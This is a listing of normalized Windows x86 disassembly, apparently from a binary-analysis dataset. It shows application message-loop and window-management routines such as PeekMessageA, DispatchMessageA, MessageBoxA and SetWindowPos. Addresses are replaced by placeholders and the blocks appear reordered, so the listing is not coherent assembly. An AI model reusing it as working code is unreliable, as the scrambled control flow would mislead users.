mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_462aec
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4621d4
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_461b04
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_448d84
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_448d84
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_462b9c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_461b04
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_448d84
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_4621e4
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_448d84
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_45d780
mov eax [ ebx + 0x44 ]
call sub_45fb9c
sub_462c9c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_462cd8
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_4040e8
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_404184
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_462d24
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_462d48
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_462d98
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_43f3dc
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_448d84
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_462e50
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_463db0
sub_462e84
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_448d84
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_403540
test al al
jne r-xdata
sub_462ef0
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_462e50
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_462d48
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_462d98
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_462d24
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_462f88
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_462ef0
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_463858
sub_462fac
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_41439c
mov eax 0x8
call sub_4026f4
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_414210
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_463008
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_4143bc
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_402714
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_41425c
jmp r-xdata
sub_46309c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push j_sub_4037e4#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_448d60
mov [ esi + 0x44 ] edi
sub_46311c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_4631fa
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_459ea4
call sub_407e78
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463201
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_45d780
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push j_sub_4037e4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_462f88
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_45c688
mov eax [ ebp - 0x4 ]
call sub_462aec
jmp r-xdata
sub_46321c
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_402784
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_4027a4
push eax
call sub_402784
pop edx
call sub_40bbf4
call sub_402784
mov edx [ rw-data ]
call sub_4034d0
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_402784
mov edx eax
mov eax ebx
call sub_463414
pop esi
pop ebx
retn
call sub_402784
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_4632ac
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_459f2c
mov [ ebp - 0x10 ] eax
call sub_459e48
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_462250
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_463401
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463408
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_459fe0
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_459e50
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_463414
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4634cf
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_40412c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_462cd8
mov eax [ ebp - 0x108 ]
call sub_404554
push eax
mov eax [ ebp - 0x4 ]
call sub_404554
mov edx eax
mov eax ebx
pop ecx
call sub_4632ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4634d6
lea eax [ ebp - 0x108 ]
call sub_404094
lea eax [ ebp - 0x4 ]
call sub_404094
retn
mov eax [ ebp - 0x4 ]
call sub_4087dc
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402e54
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402c50
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40435c
sub_4634ec
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_448f20
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_449088
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_463b90
test al al
je r-xdata
call sub_448d84
mov ebp eax
mov eax edi
call sub_448d84
mov ebp eax
mov eax esi
call sub_463b90
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_463654
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4636ac
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_463b90
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4643dc
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4636b3
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_4636bc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_463714
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_463b90
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4643dc
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46371b
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_46372c
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_403344
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_4426f0
jmp r-xdata
sub_46377c
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_460c98
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_448d84
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_460c84
mov ebx eax
mov eax ebx
call sub_449088
test al al
je r-xdata
mov eax ebx
call sub_448d84
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_4637e0
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_440dfc
mov edi eax
call sub_43f6f8
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_443750
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_443750
sub_463858
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_463968
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4637e0
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_461890
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_43f660
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_463a18
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push sub_46390f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_463db0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46377c
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_419c10
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46396f
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4040b8
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_463978
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_460c7c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_460c68
movzx edx di
xor ecx ecx
call sub_443750
inc esi
dec ebx
jne r-xdata
sub_4639b4
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_462ad0
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_462ad0
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_463978
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_463a18
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_4044a0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_4040e8
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43c13c
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44f068
xor eax eax
push ebp
push sub_463a9d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403540
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403344
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_463aac
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_463b08
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_460c7c
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_463aac
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_460c68
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_463aac
pop ecx
jmp r-xdata
mov eax ebx
call sub_449088
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_448d84
push eax
call IsChild
test eax eax
jne r-xdata
sub_463b90
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_4057e0
call sub_425b9c
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_463bb8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_463bfc
push sub_4618e8
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_463db0
sub_463c24
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406c90
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_442068
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_440dfc
call sub_4618c8
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_463db0
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406c90
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_442068
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
